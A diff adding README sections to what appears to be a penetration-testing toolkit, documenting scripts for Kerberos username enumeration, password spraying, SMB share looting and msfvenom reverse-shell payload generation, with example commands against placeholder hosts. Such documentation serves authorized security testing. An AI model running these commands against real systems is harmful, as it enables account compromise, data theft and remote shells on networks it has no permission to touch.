@@ -581,6 +581,81 @@ and an empty findings table. Optionally renders HTML with pandoc.
 A starting point for the write-up, not a finished report. Defaults the output to
 `<workspace>/report/report.md`.
 
+### `kerbrute-users.sh`
+
+Enumerates valid AD usernames pre-auth with kerbrute. Kerberos username
+enumeration is quiet (no failed-logon events) and needs no password, so it's a
+good first step before spraying.
+
+```bash
+./kerbrute-users.sh --dc 10.0.0.1 -d corp.local -U users.txt
+./kerbrute-users.sh --dc dc01.corp.local -d corp.local -U users.txt --out valid-users.txt
+```
+
+Writes the validated usernames one per line and prints the `spray.sh` command to
+run next. Needs the `kerbrute` binary on PATH.
+
+### `spray.sh`
+
+Password spraying via netexec/crackmapexec with a lockout-aware delay. Sprays
+one password across all users at a time, waits out the lockout window, then
+tries the next. Valid hits are logged to `creds-vault.sh`.
+
+```bash
+./spray.sh 10.0.0.1 -d corp.local -U users.txt -p 'Spring2025!'
+./spray.sh 10.0.0.1 -d corp.local -U users.txt -P passwords.txt --delay 1800
+./spray.sh 10.0.0.1 -d corp.local -U users.txt -P pw.txt --vault ~/eng/creds/vault.tsv
+```
+
+With a password list, only one password is tried per `--delay` window. Check the
+domain policy first (`nxc smb DC -u u -p p --pass-pol`) and set `--delay` above
+the lockout observation window. `--dry-run` shows the plan without touching the
+target.
+
+### `smb-loot.sh`
+
+Lists readable SMB shares on a host and spiders them for interesting files with
+netexec's `spider_plus` module. Credentialed or guest session.
+
+```bash
+./smb-loot.sh 10.0.0.5 -u jdoe -p 'Passw0rd!' -d corp.local
+./smb-loot.sh 10.0.0.5 -u guest -p '' --out ~/eng/loot
+./smb-loot.sh 10.0.0.5 -u jdoe -H <nthash> -d corp.local --download
+```
+
+Without `--download` it collects metadata only; `--download` pulls the files.
+Output paths vary by netexec version, so the script reports where it landed.
+
+### `payload-gen.sh`
+
+msfvenom wrapper. Pick OS/arch/format and shell type, auto-fill LHOST from an
+interface, and drop the payload into a directory (by default `serve.sh`'s). Also
+prints the matching msfconsole handler.
+
+```bash
+./payload-gen.sh --os linux   --arch x64 --format elf -i tun0 -p 4444
+./payload-gen.sh --os windows --arch x64 --format exe -i tun0 -p 443 --type meterpreter
+./payload-gen.sh --os windows --format exe -i 10.10.14.5 -p 4444 --out ./www
+```
+
+OS: linux, windows, mac, php, python. Type: shell (default) or meterpreter.
+LHOST accepts an IP or interface name. Prints both the handler one-liner and a
+`serve.sh` command to hand the file over.
+
+### `dashboard.sh`
+
+One-screen engagement status: workspace summary, credential count, killswitch /
+anonymize / pivot state, VPN interface, and the last port-monitor change.
+Read-only, no root. Reads the state the other scripts leave behind.
+
+```bash
+./dashboard.sh                       # current directory as workspace
+./dashboard.sh ~/engagements/acme
+./dashboard.sh --exit-ip             # also fetch the external IP (makes a request)
+```
+
+`--exit-ip` reaches out to an external service, so it's off by default.
+
 ## License
 
 See [LICENSE](LICENSE).
